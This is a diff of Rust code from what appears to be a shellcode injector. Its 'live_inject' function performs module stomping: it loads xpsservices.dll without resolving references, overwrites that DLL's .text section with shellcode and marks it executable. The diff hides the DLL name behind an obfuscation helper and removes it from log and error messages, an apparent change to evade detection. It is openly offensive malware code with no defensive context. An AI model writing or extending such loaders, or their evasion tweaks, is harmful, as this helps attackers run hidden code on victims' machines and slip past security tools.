@@ -1,10 +1,8 @@
 use crate::injection::InjectionResult;
 use crate::log::LogSink;
 
-const DEFAULT_VICTIM_DLL: &str = "xpsservices.dll";
-
-pub fn victim_dll() -> &'static str {
-    DEFAULT_VICTIM_DLL
+pub fn victim_dll() -> String {
+    crate::obf::s(crate::obf::XPS_DLL)
 }
 
 #[cfg(windows)]
@@ -25,12 +23,11 @@ pub fn live_inject(shellcode: &[u8], log: &LogSink) -> Result<InjectionResult, S
 
     const DONT_RESOLVE_DLL_REFERENCES: u32 = 0x0000_0001;
 
-    let dll_name = CString::new(DEFAULT_VICTIM_DLL)
+    let victim = victim_dll();
+    let dll_name = CString::new(victim.as_str())
         .map_err(|_| "invalid DLL name".to_string())?;
 
-    log.step(format!(
-        "[1/5] LoadLibraryExA(\"{DEFAULT_VICTIM_DLL}\", DONT_RESOLVE_DLL_REFERENCES)"
-    ));
+    log.step("[1/5] LoadLibraryExA(victim, DONT_RESOLVE_DLL_REFERENCES)".to_string());
     let module = unsafe {
         LoadLibraryExA(
             dll_name.as_ptr() as *const u8,
@@ -39,7 +36,7 @@ pub fn live_inject(shellcode: &[u8], log: &LogSink) -> Result<InjectionResult, S
         )
     };
     if module.is_null() {
-        return Err(format!("LoadLibraryExA(\"{DEFAULT_VICTIM_DLL}\") failed"));
+        return Err("LoadLibraryExA(victim) failed".to_string());
     }
     let base = module as *const u8;
     log.detail(format!("  Module base: 0x{:016X}", base as usize));
@@ -98,7 +95,7 @@ pub fn live_inject(shellcode: &[u8], log: &LogSink) -> Result<InjectionResult, S
     .map_err(|e| format!("VirtualProtect(RX) failed: {e}"))?;
 
     log.info(format!(
-        "  ✓ Module stomped: shellcode at 0x{:016X} inside {DEFAULT_VICTIM_DLL} .text",
+        "  ✓ Module stomped: shellcode at 0x{:016X} inside victim .text",
         text.base
     ));
     log.warning(
